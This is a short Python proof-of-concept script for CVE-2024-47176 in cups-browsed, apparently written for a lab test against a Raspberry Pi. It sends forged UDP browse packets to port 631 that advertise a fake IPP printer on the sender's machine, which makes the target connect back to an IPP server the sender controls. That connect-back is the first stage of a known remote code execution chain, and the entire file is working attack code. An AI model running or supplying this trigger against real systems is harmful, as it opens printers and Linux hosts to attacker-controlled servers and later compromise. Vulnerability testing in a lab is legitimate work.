import socket
import time

def get_local_ip(target_ip):
    """Auto-detect local IP by checking which interface routes to target"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()

# Only thing you need to change
PI_IP = "172.20.9.55"

# Everything else is automatic
CLIENT_IP = get_local_ip(PI_IP)
CLIENT_PORT = 631
PRINTER_NAME = "FAKE_PRINTER"

def send_browse_packet():
    packet = (
        f"0x3 0x0 ipp://{CLIENT_IP}:{CLIENT_PORT}/printers/{PRINTER_NAME} "
        f'"Lab Printer" "CVE-2024-47176 Test" "Test Printer"'
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((CLIENT_IP, 0))

    print(f"[*] Detected client IP: {CLIENT_IP}")
    print(f"[*] Targeting Pi at: {PI_IP}:631")
    print(f"[*] Advertising fake printer at ipp://{CLIENT_IP}:{CLIENT_PORT}/printers/{PRINTER_NAME}")

    for i in range(5):
        sock.sendto(packet.encode(), (PI_IP, 631))
        print(f"[*] Packet {i+1}/5 sent")
        time.sleep(1)

    sock.close()
    print("[+] Done. Check IPP server for incoming connections.")

if __name__ == "__main__":
    send_browse_packet()
